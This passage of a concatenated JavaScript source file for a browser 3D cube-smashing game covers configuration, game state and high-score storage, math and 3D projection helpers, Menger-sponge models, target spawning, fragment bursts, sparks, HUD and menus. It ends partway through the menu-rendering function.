// globalConfig.js
// ============================================================================
// ============================================================================

// Provides global variables used by the entire program.
// Most of this should be configuration.

// Timing multiplier for entire game engine.
let gameSpeed = 1;

// Colors
const BLUE =   { r: 0x67, g: 0xd7, b: 0xf0 };
const GREEN =  { r: 0xa6, g: 0xe0, b: 0x2c };
const PINK =   { r: 0xfa, g: 0x24, b: 0x73 };
const ORANGE = { r: 0xfe, g: 0x95, b: 0x22 };
const allColors = [BLUE, GREEN, PINK, ORANGE];

// Gameplay
const getSpawnDelay = () => {
	const spawnDelayMax = 1400;
	const spawnDelayMin = 550;
	const spawnDelay = spawnDelayMax - state.game.cubeCount * 3.1;
	return Math.max(spawnDelay, spawnDelayMin);
}
const doubleStrongEnableScore = 2000;
// Number of cubes that must be smashed before activating a feature.
const slowmoThreshold = 10;
const strongThreshold = 25;
const spinnerThreshold = 25;

// Interaction state
let pointerIsDown = false;
// The last known position of the primary pointer in screen coordinates.`
let pointerScreen = { x: 0, y: 0 };
// Same as `pointerScreen`, but converted to scene coordinates in rAF.
let pointerScene = { x: 0, y: 0 };
// Minimum speed of pointer before "hits" are counted.
const minPointerSpeed = 60;
// The hit speed affects the direction the target post-hit. This number dampens that force.
const hitDampening = 0.1;
// Backboard receives shadows and is the farthest negative Z position of entities.
const backboardZ = -400;
const shadowColor = '#262e36';
// How much air drag is applied to standard objects
const airDrag = 0.022;
const gravity = 0.3;
// Spark config
const sparkColor = 'rgba(170,221,255,.9)';
const sparkThickness = 2.2;
const airDragSpark = 0.1;
// Track pointer positions to show trail
const touchTrailColor = 'rgba(170,221,255,.62)';
const touchTrailThickness = 7;
const touchPointLife = 120;
const touchPoints = [];
// Size of in-game targets. This affects rendered size and hit area.
const targetRadius = 40;
const targetHitRadius = 50;
const makeTargetGlueColor = target => {
	// const alpha = (target.health - 1) / (target.maxHealth - 1);
	// return `rgba(170,221,255,${alpha.toFixed(3)})`;
	return 'rgb(170,221,255)';
};
// Size of target fragments
const fragRadius = targetRadius / 3;



// Game canvas element needed in setup.js and interaction.js
const canvas = document.querySelector('#c');

// 3D camera config
// Affects perspective
const cameraDistance = 900;
// Does not affect perspective
const sceneScale = 1;
// Objects that get too close to the camera will be faded out to transparent over this range.
// const cameraFadeStartZ = 0.8*cameraDistance - 6*targetRadius;
const cameraFadeStartZ = 0.45*cameraDistance;
const cameraFadeEndZ = 0.65*cameraDistance;
const cameraFadeRange = cameraFadeEndZ - cameraFadeStartZ;

// Globals used to accumlate all vertices/polygons in each frame
const allVertices = [];
const allPolys = [];
const allShadowVertices = [];
const allShadowPolys = [];




// state.js
// ============================================================================
// ============================================================================

///////////
// Enums //
///////////

// Game Modes
const GAME_MODE_RANKED = Symbol('GAME_MODE_RANKED');
const GAME_MODE_CASUAL = Symbol('GAME_MODE_CASUAL');

// Available Menus
const MENU_MAIN = Symbol('MENU_MAIN');
const MENU_PAUSE = Symbol('MENU_PAUSE');
const MENU_SCORE = Symbol('MENU_SCORE');



//////////////////
// Global State //
//////////////////

const state = {
	game: {
		mode: GAME_MODE_RANKED,
		// Run time of current game.
		time: 0,
		// Player score.
		score: 0,
		// Total number of cubes smashed in game.
		cubeCount: 0
	},
	menus: {
		// Set to `null` to hide all menus
		active: MENU_MAIN
	}
};


////////////////////////////
// Global State Selectors //
////////////////////////////

const isInGame = () => !state.menus.active;
const isMenuVisible = () => !!state.menus.active;
const isCasualGame = () => state.game.mode === GAME_MODE_CASUAL;
const isPaused = () => state.menus.active === MENU_PAUSE;


///////////////////
// Local Storage //
///////////////////

const highScoreKey = '__menja__highScore';
const getHighScore = () => {
	const raw = localStorage.getItem(highScoreKey);
	return raw ? parseInt(raw, 10) : 0;
};

let _lastHighscore = getHighScore();
const setHighScore = score => {
	_lastHighscore = getHighScore();
	localStorage.setItem(highScoreKey, String(score));
};

const isNewHighScore = () => state.game.score > _lastHighscore;




// utils.js
// ============================================================================
// ============================================================================


const invariant = (condition, message) => {
	if (!condition) throw new Error(message);
};


/////////
// DOM //
/////////

const $ = selector => document.querySelector(selector);
const handleClick = (element, handler) => element.addEventListener('click', handler);
const handlePointerDown = (element, handler) => {
	element.addEventListener('touchstart', handler);
	element.addEventListener('mousedown', handler);
};



////////////////////////
// Formatting Helpers //
////////////////////////

// Converts a number into a formatted string with thousand separators.
const formatNumber = num => num.toLocaleString();



////////////////////
// Math Constants //
////////////////////

const PI = Math.PI;
const TAU = Math.PI * 2;
const ETA = Math.PI * 0.5;



//////////////////
// Math Helpers //
//////////////////

// Clamps a number between min and max values (inclusive)
const clamp = (num, min, max) => Math.min(Math.max(num, min), max);

// Linearly interpolate between numbers a and b by a specific amount.
// mix >= 0 && mix <= 1
const lerp = (a, b, mix) => (b - a) * mix + a;




////////////////////
// Random Helpers //
////////////////////

// Generates a random number between min (inclusive) and max (exclusive)
const random = (min, max) => Math.random() * (max - min) + min;

// Generates a random integer between and possibly including min and max values
const randomInt = (min, max) => ((Math.random() * (max - min + 1)) | 0) + min;

// Returns a random element from an array
const pickOne = arr => arr[Math.random() * arr.length | 0];




///////////////////
// Color Helpers //
///////////////////

// Converts an { r, g, b } color object to a 6-digit hex code.
const colorToHex = color => {
	return '#' +
		(color.r | 0).toString(16).padStart(2, '0') +
		(color.g | 0).toString(16).padStart(2, '0') +
		(color.b | 0).toString(16).padStart(2, '0');
};

// Operates on an { r, g, b } color object.
// Returns string hex code.
// `lightness` must range from 0 to 1. 0 is pure black, 1 is pure white.
const shadeColor = (color, lightness) => {
	let other, mix;
	if (lightness < 0.5) {
		other = 0;
		mix = 1 - (lightness * 2);
	} else {
		other = 255;
		mix = lightness * 2 - 1;
	}
	return '#' +
		(lerp(color.r, other, mix) | 0).toString(16).padStart(2, '0') +
		(lerp(color.g, other, mix) | 0).toString(16).padStart(2, '0') +
		(lerp(color.b, other, mix) | 0).toString(16).padStart(2, '0');
};





////////////////////
// Timing Helpers //
////////////////////

const _allCooldowns = [];

const makeCooldown = (rechargeTime, units=1) => {
	let timeRemaining = 0;
	let lastTime = 0;

	const initialOptions = { rechargeTime, units };

	const updateTime = () => {
		const now = state.game.time;
		// Reset time remaining if time goes backwards.
		if (now < lastTime) {
			timeRemaining = 0;
		} else {
			// update...
			timeRemaining -= now-lastTime;
			if (timeRemaining < 0) timeRemaining = 0;
		}
		lastTime = now;
	};

	const canUse = () => {
		updateTime();
		return timeRemaining <= (rechargeTime * (units-1));
	};

	const cooldown = {
		canUse,
		useIfAble() {
			const usable = canUse();
			if (usable) timeRemaining += rechargeTime;
			return usable;
		},
		mutate(options) {
			if (options.rechargeTime) {
				// Apply recharge time delta so change takes effect immediately.
				timeRemaining -= rechargeTime-options.rechargeTime;
				if (timeRemaining < 0) timeRemaining = 0;
				rechargeTime = options.rechargeTime;
			}
			if (options.units) units = options.units;
		},
		reset() {
			timeRemaining = 0;
			lastTime = 0;
			this.mutate(initialOptions);
		}
	};

	_allCooldowns.push(cooldown);

	return cooldown;
};

const resetAllCooldowns = () => _allCooldowns.forEach(cooldown => cooldown.reset());

const makeSpawner = ({ chance, cooldownPerSpawn, maxSpawns }) => {
	const cooldown = makeCooldown(cooldownPerSpawn, maxSpawns);
	return {
		shouldSpawn() {
			return Math.random() <= chance && cooldown.useIfAble();
		},
		mutate(options) {
			if (options.chance) chance = options.chance;
			cooldown.mutate({
				rechargeTime: options.cooldownPerSpawn,
				units: options.maxSpawns
			});
		}
	};
};




////////////////////
// Vector Helpers //
////////////////////

const normalize = v => {
	const mag = Math.hypot(v.x, v.y, v.z);
	return {
		x: v.x / mag,
		y: v.y / mag,
		z: v.z / mag
	};
}

// Curried math helpers
const add = a => b => a + b;
// Curried vector helpers
const scaleVector = scale => vector => {
	vector.x *= scale;
	vector.y *= scale;
	vector.z *= scale;
};








////////////////
// 3D Helpers //
////////////////

// Clone array and all vertices.
function cloneVertices(vertices) {
	return vertices.map(v => ({ x: v.x, y: v.y, z: v.z }));
}

// Copy vertex data from one array into another.
// Arrays must be the same length.
function copyVerticesTo(arr1, arr2) {
	const len = arr1.length;
	for (let i=0; i<len; i++) {
		const v1 = arr1[i];
		const v2 = arr2[i];
		v2.x = v1.x;
		v2.y = v1.y;
		v2.z = v1.z;
	}
}

// Compute triangle midpoint.
// Mutates `middle` property of given `poly`.
function computeTriMiddle(poly) {
	const v = poly.vertices;
	poly.middle.x = (v[0].x + v[1].x + v[2].x) / 3;
	poly.middle.y = (v[0].y + v[1].y + v[2].y) / 3;
	poly.middle.z = (v[0].z + v[1].z + v[2].z) / 3;
}

// Compute quad midpoint.
// Mutates `middle` property of given `poly`.
function computeQuadMiddle(poly) {
	const v = poly.vertices;
	poly.middle.x = (v[0].x + v[1].x + v[2].x + v[3].x) / 4;
	poly.middle.y = (v[0].y + v[1].y + v[2].y + v[3].y) / 4;
	poly.middle.z = (v[0].z + v[1].z + v[2].z + v[3].z) / 4;
}

function computePolyMiddle(poly) {
	if (poly.vertices.length === 3) {
		computeTriMiddle(poly);
	} else {
		computeQuadMiddle(poly);
	}
}

// Compute distance from any polygon (tri or quad) midpoint to camera.
// Sets `depth` property of given `poly`.
// Also triggers midpoint calculation, which mutates `middle` property of `poly`.
function computePolyDepth(poly) {
	computePolyMiddle(poly);
	const dX = poly.middle.x;
	const dY = poly.middle.y;
	const dZ = poly.middle.z - cameraDistance;
	poly.depth = Math.hypot(dX, dY, dZ);
}

// Compute normal of any polygon. Uses normalized vector cross product.
// Mutates `normalName` property of given `poly`.
function computePolyNormal(poly, normalName) {
	// Store quick refs to vertices
	const v1 = poly.vertices[0];
	const v2 = poly.vertices[1];
	const v3 = poly.vertices[2];
	// Calculate difference of vertices, following winding order.
	const ax = v1.x - v2.x;
	const ay = v1.y - v2.y;
	const az = v1.z - v2.z;
	const bx = v1.x - v3.x;
	const by = v1.y - v3.y;
	const bz = v1.z - v3.z;
	// Cross product
	const nx = ay*bz - az*by;
	const ny = az*bx - ax*bz;
	const nz = ax*by - ay*bx;
	// Compute magnitude of normal and normalize
	const mag = Math.hypot(nx, ny, nz);
	const polyNormal = poly[normalName];
	polyNormal.x = nx / mag;
	polyNormal.y = ny / mag;
	polyNormal.z = nz / mag;
}

// Apply translation/rotation/scale to all given vertices.
// If `vertices` and `target` are the same array, the vertices will be mutated in place.
// If `vertices` and `target` are different arrays, `vertices` will not be touched, instead the
// transformed values from `vertices` will be written to `target` array.
function transformVertices(vertices, target, tX, tY, tZ, rX, rY, rZ, sX, sY, sZ) {
	// Matrix multiplcation constants only need calculated once for all vertices.
	const sinX = Math.sin(rX);
	const cosX = Math.cos(rX);
	const sinY = Math.sin(rY);
	const cosY = Math.cos(rY);
	const sinZ = Math.sin(rZ);
	const cosZ = Math.cos(rZ);

	// Using forEach() like map(), but with a (recycled) target array.
	vertices.forEach((v, i) => {
		const targetVertex = target[i];
		// X axis rotation
		const x1 = v.x;
		const y1 = v.z*sinX + v.y*cosX;
		const z1 = v.z*cosX - v.y*sinX;
		// Y axis rotation
		const x2 = x1*cosY - z1*sinY;
		const y2 = y1;
		const z2 = x1*sinY + z1*cosY;
		// Z axis rotation
		const x3 = x2*cosZ - y2*sinZ;
		const y3 = x2*sinZ + y2*cosZ;
		const z3 = z2;

		// Scale, Translate, and set the transform.
		targetVertex.x = x3 * sX + tX;
		targetVertex.y = y3 * sY + tY;
		targetVertex.z = z3 * sZ + tZ;
	});
}

// 3D projection on a single vertex.
// Directly mutates the vertex.
const projectVertex = v => {
	const focalLength = cameraDistance * sceneScale;
	const depth = focalLength / (cameraDistance - v.z);
	v.x = v.x * depth;
	v.y = v.y * depth;
};

// 3D projection on a single vertex.
// Mutates a secondary target vertex.
const projectVertexTo = (v, target) => {
	const focalLength = cameraDistance * sceneScale;
	const depth = focalLength / (cameraDistance - v.z);
	target.x = v.x * depth;
	target.y = v.y * depth;
};





// PERF.js
// ============================================================================
// ============================================================================

// Dummy no-op functions.
// I use these in a special build for custom performance profiling.
const PERF_START = () => {};
const PERF_END = () => {};
const PERF_UPDATE = () => {};




// 3dModels.js
// ============================================================================
// ============================================================================

// Define models once. The origin is the center of the model.

// A simple cube, 8 vertices, 6 quads.
// Defaults to an edge length of 2 units, can be influenced with `scale`.
function makeCubeModel({ scale=1 }) {
	return {
		vertices: [
			// top
			{ x: -scale, y: -scale, z: scale },
			{ x:  scale, y: -scale, z: scale },
			{ x:  scale, y:  scale, z: scale },
			{ x: -scale, y:  scale, z: scale },
			// bottom
			{ x: -scale, y: -scale, z: -scale },
			{ x:  scale, y: -scale, z: -scale },
			{ x:  scale, y:  scale, z: -scale },
			{ x: -scale, y:  scale, z: -scale }
		],
		polys: [
			// z = 1
			{ vIndexes: [0, 1, 2, 3] },
			// z = -1
			{ vIndexes: [7, 6, 5, 4] },
			// y = 1
			{ vIndexes: [3, 2, 6, 7] },
			// y = -1
			{ vIndexes: [4, 5, 1, 0] },
			// x = 1
			{ vIndexes: [5, 6, 2, 1] },
			// x = -1
			{ vIndexes: [0, 3, 7, 4] }
		]
	};
}

// Not very optimized - lots of duplicate vertices are generated.
function makeRecursiveCubeModel({ recursionLevel, splitFn, color, scale=1 }) {
	const getScaleAtLevel = level => 1 / (3 ** level);

	// We can model level 0 manually. It's just a single, centered, cube.
	let cubeOrigins = [{ x: 0, y: 0, z: 0 }];

	// Recursively replace cubes with smaller cubes.
	for (let i=1; i<=recursionLevel; i++) {
		const scale = getScaleAtLevel(i) * 2;
		const cubeOrigins2 = [];
		cubeOrigins.forEach(origin => {
			cubeOrigins2.push(...splitFn(origin, scale));
		});
		cubeOrigins = cubeOrigins2;
	}

	const finalModel = { vertices: [], polys: [] };

	// Generate single cube model and scale it.
	const cubeModel = makeCubeModel({ scale: 1 });
	cubeModel.vertices.forEach(scaleVector(getScaleAtLevel(recursionLevel)));

	// Compute the max distance x, y, or z origin values will be.
	// Same result as `Math.max(...cubeOrigins.map(o => o.x))`, but much faster.
	const maxComponent = getScaleAtLevel(recursionLevel) * (3 ** recursionLevel - 1);

	// Place cube geometry at each origin.
	cubeOrigins.forEach((origin, cubeIndex) => {
		// To compute occlusion (shading), find origin component with greatest
		// magnitude and normalize it relative to `maxComponent`.
		const occlusion = Math.max(
			Math.abs(origin.x),
			Math.abs(origin.y),
			Math.abs(origin.z)
		) / maxComponent;
		// At lower iterations, occlusion looks better lightened up a bit.
		const occlusionLighter = recursionLevel > 2
			? occlusion
			: (occlusion + 0.8) / 1.8;
		// Clone, translate vertices to origin, and apply scale
		finalModel.vertices.push(
			...cubeModel.vertices.map(v => ({
				x: (v.x + origin.x) * scale,
				y: (v.y + origin.y) * scale,
				z: (v.z + origin.z) * scale
			}))
		);
		// Clone polys, shift referenced vertex indexes, and compute color.
		finalModel.polys.push(
			...cubeModel.polys.map(poly => ({
				vIndexes: poly.vIndexes.map(add(cubeIndex * 8))
			}))
		);
	});

	return finalModel;
}


// o: Vector3D - Position of cube's origin (center).
// s: Vector3D - Determines size of menger sponge.
function mengerSpongeSplit(o, s) {
	return [
		// Top
		{ x: o.x + s, y: o.y - s, z: o.z + s },
		{ x: o.x + s, y: o.y - s, z: o.z + 0 },
		{ x: o.x + s, y: o.y - s, z: o.z - s },
		{ x: o.x + 0, y: o.y - s, z: o.z + s },
		{ x: o.x + 0, y: o.y - s, z: o.z - s },
		{ x: o.x - s, y: o.y - s, z: o.z + s },
		{ x: o.x - s, y: o.y - s, z: o.z + 0 },
		{ x: o.x - s, y: o.y - s, z: o.z - s },
		// Bottom
		{ x: o.x + s, y: o.y + s, z: o.z + s },
		{ x: o.x + s, y: o.y + s, z: o.z + 0 },
		{ x: o.x + s, y: o.y + s, z: o.z - s },
		{ x: o.x + 0, y: o.y + s, z: o.z + s },
		{ x: o.x + 0, y: o.y + s, z: o.z - s },
		{ x: o.x - s, y: o.y + s, z: o.z + s },
		{ x: o.x - s, y: o.y + s, z: o.z + 0 },
		{ x: o.x - s, y: o.y + s, z: o.z - s },
		// Middle
		{ x: o.x + s, y: o.y + 0, z: o.z + s },
		{ x: o.x + s, y: o.y + 0, z: o.z - s },
		{ x: o.x - s, y: o.y + 0, z: o.z + s },
		{ x: o.x - s, y: o.y + 0, z: o.z - s }
	];
}



// Helper to optimize models by merging duplicate vertices within a threshold,
// and removing all polys that share the same vertices.
// Directly mutates the model.
function optimizeModel(model, threshold=0.0001) {
	const { vertices, polys } = model;

	const compareVertices = (v1, v2) => (
		Math.abs(v1.x - v2.x) < threshold &&
		Math.abs(v1.y - v2.y) < threshold &&
		Math.abs(v1.z - v2.z) < threshold
	);

	const comparePolys = (p1, p2) => {
		const v1 = p1.vIndexes;
		const v2 = p2.vIndexes;
		return (
			(
				v1[0] === v2[0] ||
				v1[0] === v2[1] ||
				v1[0] === v2[2] ||
				v1[0] === v2[3]
			) && (
				v1[1] === v2[0] ||
				v1[1] === v2[1] ||
				v1[1] === v2[2] ||
				v1[1] === v2[3]
			) && (
				v1[2] === v2[0] ||
				v1[2] === v2[1] ||
				v1[2] === v2[2] ||
				v1[2] === v2[3]
			) && (
				v1[3] === v2[0] ||
				v1[3] === v2[1] ||
				v1[3] === v2[2] ||
				v1[3] === v2[3]
			)
		);
	};


	vertices.forEach((v, i) => {
		v.originalIndexes = [i];
	});

	for (let i=vertices.length-1; i>=0; i--) {
		for (let ii=i-1; ii>=0; ii--) {
			const v1 = vertices[i];
			const v2 = vertices[ii];
			if (compareVertices(v1, v2)) {
				vertices.splice(i, 1);
				v2.originalIndexes.push(...v1.originalIndexes);
				break;
			}
		}
	}

	vertices.forEach((v, i) => {
		polys.forEach(p => {
			p.vIndexes.forEach((vi, ii, arr) => {
				const vo = v.originalIndexes;
				if (vo.includes(vi)) {
					arr[ii] = i;
				}
			});
		});
	});

	polys.forEach(p => {
		const vi = p.vIndexes;
		p.sum = vi[0] + vi[1] + vi[2] + vi[3];
	});
	polys.sort((a, b) => b.sum - a.sum);

	// Assumptions:
	// 1. Each poly will either have no duplicates or 1 duplicate.
	// 2. If two polys are equal, they are both hidden (two cubes touching),
	//    therefore both can be removed.
	for (let i=polys.length-1; i>=0; i--) {
		for (let ii=i-1; ii>=0; ii--) {
			const p1 = polys[i];
			const p2 = polys[ii];
			if (p1.sum !== p2.sum) break;
			if (comparePolys(p1, p2)) {
				polys.splice(i, 1);
				polys.splice(ii, 1);
				i--;
				break;
			}
		}
	}

	return model;
}





// Entity.js
// ============================================================================
// ============================================================================

class Entity {
	constructor({ model, color, wireframe=false }) {
		const vertices = cloneVertices(model.vertices);
		const shadowVertices = cloneVertices(model.vertices);
		const colorHex = colorToHex(color);
		const darkColorHex = shadeColor(color, 0.4);

		const polys = model.polys.map(p => ({
			vertices: p.vIndexes.map(vIndex => vertices[vIndex]),
			color: color, // custom rgb color object
			wireframe: wireframe,
			strokeWidth: wireframe ? 2 : 0, // Set to non-zero value to draw stroke
			strokeColor: colorHex, // must be a CSS color string
			strokeColorDark: darkColorHex, // must be a CSS color string
			depth: 0,
			middle: { x: 0, y: 0, z: 0 },
			normalWorld: { x: 0, y: 0, z: 0 },
			normalCamera: { x: 0, y: 0, z: 0 }
		}));

		const shadowPolys = model.polys.map(p => ({
			vertices: p.vIndexes.map(vIndex => shadowVertices[vIndex]),
			wireframe: wireframe,
			normalWorld: { x: 0, y: 0, z: 0 }
		}));

		this.projected = {}; // Will store 2D projected data
		this.model = model;
		this.vertices = vertices;
		this.polys = polys;
		this.shadowVertices = shadowVertices;
		this.shadowPolys = shadowPolys;
		this.reset();
	}

	// Better names: resetEntity, resetTransform, resetEntityTransform
	reset() {
		this.x = 0;
		this.y = 0;
		this.z = 0;
		this.xD = 0;
		this.yD = 0;
		this.zD = 0;

		this.rotateX = 0;
		this.rotateY = 0;
		this.rotateZ = 0;
		this.rotateXD = 0;
		this.rotateYD = 0;
		this.rotateZD = 0;

		this.scaleX = 1;
		this.scaleY = 1;
		this.scaleZ = 1;

		this.projected.x = 0;
		this.projected.y = 0;
	}

	transform() {
		transformVertices(
			this.model.vertices,
			this.vertices,
			this.x,
			this.y,
			this.z,
			this.rotateX,
			this.rotateY,
			this.rotateZ,
			this.scaleX,
			this.scaleY,
			this.scaleZ
		);

		copyVerticesTo(this.vertices, this.shadowVertices);
	}

	// Projects origin point, stored as `projected` property.
	project() {
		projectVertexTo(this, this.projected);
	}
}





// getTarget.js
// ============================================================================
// ============================================================================

// All active targets
const targets = [];

// Pool target instances by color, using a Map.
// keys are color objects, and values are arrays of targets.
// Also pool wireframe instances separately.
const targetPool = new Map(allColors.map(c=>([c, []])));
const targetWireframePool = new Map(allColors.map(c=>([c, []])));



const getTarget = (() => {

	const slowmoSpawner = makeSpawner({
		chance: 0.5,
		cooldownPerSpawn: 10000,
		maxSpawns: 1
	});

	let doubleStrong = false;
	const strongSpawner = makeSpawner({
		chance: 0.3,
		cooldownPerSpawn: 12000,
		maxSpawns: 1
	});

	const spinnerSpawner = makeSpawner({
		chance: 0.1,
		cooldownPerSpawn: 10000,
		maxSpawns: 1
	});

	// Cached array instances, no need to allocate every time.
	const axisOptions = [
		['x', 'y'],
		['y', 'z'],
		['z', 'x']
	];

	function getTargetOfStyle(color, wireframe) {
		const pool = wireframe ? targetWireframePool : targetPool;
		let target = pool.get(color).pop();
		if (!target) {
			target = new Entity({
				model: optimizeModel(makeRecursiveCubeModel({
					recursionLevel: 1,
					splitFn: mengerSpongeSplit,
					scale: targetRadius
				})),
				color: color,
				wireframe: wireframe
			});

			// Init any properties that will be used.
			// These will not be automatically reset when recycled.
			target.color = color;
			target.wireframe = wireframe;
			// Some properties don't have their final value yet.
			// Initialize with any value of the right type.
			target.hit = false;
			target.maxHealth = 0;
			target.health = 0;
		}
		return target;
	}

	return function getTarget() {
		if (doubleStrong && state.game.score <= doubleStrongEnableScore) {
			doubleStrong = false;
			// Spawner is reset automatically when game resets.
		} else if (!doubleStrong && state.game.score > doubleStrongEnableScore) {
			doubleStrong = true;
			strongSpawner.mutate({ maxSpawns: 2 });
		}

		// Target Parameters
		// --------------------------------
		let color = pickOne([BLUE, GREEN, ORANGE]);
		let wireframe = false;
		let health = 1;
		let maxHealth = 3;
		const spinner = state.game.cubeCount >= spinnerThreshold && isInGame() && spinnerSpawner.shouldSpawn();

		// Target Parameter Overrides
		// --------------------------------
		if (state.game.cubeCount >= slowmoThreshold && slowmoSpawner.shouldSpawn()) {
			color = BLUE;
			wireframe = true;
		}
		else if (state.game.cubeCount >= strongThreshold && strongSpawner.shouldSpawn()) {
			color = PINK;
			health = 3;
		}

		// Target Creation
		// --------------------------------
		const target = getTargetOfStyle(color, wireframe);
		target.hit = false;
		target.maxHealth = maxHealth;
		target.health = health;
		updateTargetHealth(target, 0);

		const spinSpeeds = [
			Math.random() * 0.1 - 0.05,
			Math.random() * 0.1 - 0.05
		];

		if (spinner) {
			// Ends up spinning a random axis
			spinSpeeds[0] = -0.25;
			spinSpeeds[1] = 0;
			target.rotateZ = random(0, TAU);
		}

		const axes = pickOne(axisOptions);

		spinSpeeds.forEach((spinSpeed, i) => {
			switch (axes[i]) {
				case 'x':
					target.rotateXD = spinSpeed;
					break;
				case 'y':
					target.rotateYD = spinSpeed;
					break;
				case 'z':
					target.rotateZD = spinSpeed;
					break;
			}
		});

		return target;
	}
})();


const updateTargetHealth = (target, healthDelta) => {
	target.health += healthDelta;
	// Only update stroke on non-wireframe targets.
	// Showing "glue" is a temporary attempt to display health. For now, there's
	// no reason to have wireframe targets with high health, so we're fine.
	if (!target.wireframe) {
		const strokeWidth = target.health - 1;
		const strokeColor = makeTargetGlueColor(target);
		for (let p of target.polys) {
			p.strokeWidth = strokeWidth;
			p.strokeColor = strokeColor;
		}
	}
};


const returnTarget = target => {
	target.reset();
	const pool = target.wireframe ? targetWireframePool : targetPool;
	pool.get(target.color).push(target);
};


function resetAllTargets() {
	while(targets.length) {
		returnTarget(targets.pop());
	}
}





// createBurst.js
// ============================================================================
// ============================================================================

// Track all active fragments
const frags = [];
// Pool inactive fragments by color, using a Map.
// keys are color objects, and values are arrays of fragments.
// // Also pool wireframe instances separately.
const fragPool = new Map(allColors.map(c=>([c, []])));
const fragWireframePool = new Map(allColors.map(c=>([c, []])));


const createBurst = (() => {
	// Precompute some private data to be reused for all bursts.
	const basePositions = mengerSpongeSplit({ x:0, y:0, z:0 }, fragRadius*2);
	const positions = cloneVertices(basePositions);
	const prevPositions = cloneVertices(basePositions);
	const velocities = cloneVertices(basePositions);

	const basePositionNormals = basePositions.map(normalize);
	const positionNormals = cloneVertices(basePositionNormals);


	const fragCount = basePositions.length;

	function getFragForTarget(target) {
		const pool = target.wireframe ? fragWireframePool : fragPool;
		let frag = pool.get(target.color).pop();
		if (!frag) {
			frag = new Entity({
				model: makeCubeModel({ scale: fragRadius }),
				color: target.color,
				wireframe: target.wireframe
			});
			frag.color = target.color;
			frag.wireframe = target.wireframe;
		}
		return frag;
	}

	return (target, force=1) => {
		// Calculate fragment positions, and what would have been the previous positions
		// when still a part of the larger target.
		transformVertices(
			basePositions, positions,
			target.x, target.y, target.z,
			target.rotateX, target.rotateY, target.rotateZ,
			1, 1, 1
		);
		transformVertices(
			basePositions, prevPositions,
			target.x - target.xD, target.y - target.yD, target.z - target.zD,
			target.rotateX - target.rotateXD, target.rotateY - target.rotateYD, target.rotateZ - target.rotateZD,
			1, 1, 1
		);

		// Compute velocity of each fragment, based on previous positions.
		// Will write to `velocities` array.
		for (let i=0; i<fragCount; i++) {
			const position = positions[i];
			const prevPosition = prevPositions[i];
			const velocity = velocities[i];

			velocity.x = position.x - prevPosition.x;
			velocity.y = position.y - prevPosition.y;
			velocity.z = position.z - prevPosition.z;
		}



		// Apply target rotation to normals
		transformVertices(
			basePositionNormals, positionNormals,
			0, 0, 0,
			target.rotateX, target.rotateY, target.rotateZ,
			1, 1, 1
		);


		for (let i=0; i<fragCount; i++) {
			const position = positions[i];
			const velocity = velocities[i];
			const normal = positionNormals[i];

			const frag = getFragForTarget(target);

			frag.x = position.x;
			frag.y = position.y;
			frag.z = position.z;
			frag.rotateX = target.rotateX;
			frag.rotateY = target.rotateY;
			frag.rotateZ = target.rotateZ;


			const burstSpeed = 2 * force;
			const randSpeed = 2 * force;
			const rotateScale = 0.015;
			frag.xD = velocity.x + (normal.x * burstSpeed) + (Math.random() * randSpeed);
			frag.yD = velocity.y + (normal.y * burstSpeed) + (Math.random() * randSpeed);
			frag.zD = velocity.z + (normal.z * burstSpeed) + (Math.random() * randSpeed);
			frag.rotateXD = frag.xD * rotateScale;
			frag.rotateYD = frag.yD * rotateScale;
			frag.rotateZD = frag.zD * rotateScale;

			frags.push(frag);
		};
	}
})();


const returnFrag = frag => {
	frag.reset();
	const pool = frag.wireframe ? fragWireframePool : fragPool;
	pool.get(frag.color).push(frag);
};





// sparks.js
// ============================================================================
// ============================================================================

const sparks = [];
const sparkPool = [];


function addSpark(x, y, xD, yD) {
	const spark = sparkPool.pop() || {};

	spark.x = x + xD * 0.5;
	spark.y = y + yD * 0.5;
	spark.xD = xD;
	spark.yD = yD;
	spark.life = random(200, 300);
	spark.maxLife = spark.life;

	sparks.push(spark);

	return spark;
}


// Spherical spark burst
function sparkBurst(x, y, count, maxSpeed) {
	const angleInc = TAU / count;
	for (let i=0; i<count; i++) {
		const angle = i * angleInc + angleInc * Math.random();
		const speed = (1 - Math.random() ** 3) * maxSpeed;
		addSpark(
			x,
			y,
			Math.sin(angle) * speed,
			Math.cos(angle) * speed
		);
	}
}


// Make a target "leak" sparks from all vertices.
// This is used to create the effect of target glue "shedding".
let glueShedVertices;
function glueShedSparks(target) {
	if (!glueShedVertices) {
		glueShedVertices = cloneVertices(target.vertices);
	} else {
		copyVerticesTo(target.vertices, glueShedVertices);
	}

	glueShedVertices.forEach(v => {
		if (Math.random() < 0.4) {
			projectVertex(v);
			addSpark(
				v.x,
				v.y,
				random(-12, 12),
				random(-12, 12)
			);
		}
	});
}

function returnSpark(spark) {
	sparkPool.push(spark);
}





// hud.js
// ============================================================================
// ============================================================================

const hudContainerNode = $('.hud');

function setHudVisibility(visible) {
	if (visible) {
		hudContainerNode.style.display = 'block';
	} else {
		hudContainerNode.style.display = 'none';
	}
}


///////////
// Score //
///////////
const scoreNode = $('.score-lbl');
const cubeCountNode = $('.cube-count-lbl');

function renderScoreHud() {
	if (isCasualGame()) {
		scoreNode.style.display = 'none';
		cubeCountNode.style.opacity = 1;
	} else {
		scoreNode.innerText = `SCORE: ${state.game.score}`;
		scoreNode.style.display = 'block';
		cubeCountNode.style.opacity = 0.65 ;
	}
	cubeCountNode.innerText = `CUBES SMASHED: ${state.game.cubeCount}`;
}

renderScoreHud();


//////////////////
// Pause Button //
//////////////////

handlePointerDown($('.pause-btn'), () => pauseGame());


////////////////////
// Slow-Mo Status //
////////////////////

const slowmoNode = $('.slowmo');
const slowmoBarNode = $('.slowmo__bar');

function renderSlowmoStatus(percentRemaining) {
	slowmoNode.style.opacity = percentRemaining === 0 ? 0 : 1;
	slowmoBarNode.style.transform = `scaleX(${percentRemaining.toFixed(3)})`;
}





// menus.js
// ============================================================================
// ============================================================================

// Top-level menu containers
const menuContainerNode = $('.menus');
const menuMainNode = $('.menu--main');
const menuPauseNode = $('.menu--pause');
const menuScoreNode = $('.menu--score');

const finalScoreLblNode = $('.final-score-lbl');
const highScoreLblNode = $('.high-score-lbl');



function showMenu(node) {
	node.classList.add('active');
}

function hideMenu(node) {
	node.classList.remove('active');
}

function renderMenus() {
	hideMenu(menuMainNode);
	hideMenu(menuPauseNode);
	hideMenu(menuScoreNode);

	switch (state.menus.active) {
		case MENU_MAIN:
			showMenu(menuMainNode);
			break;
		case MENU_PAUSE:
			showMenu(menuPauseNode);
			break;
		case MENU_SCORE:
			finalScoreLblNode.textContent = formatNumber(state.game.score);
			if (isNewHighScore()) {
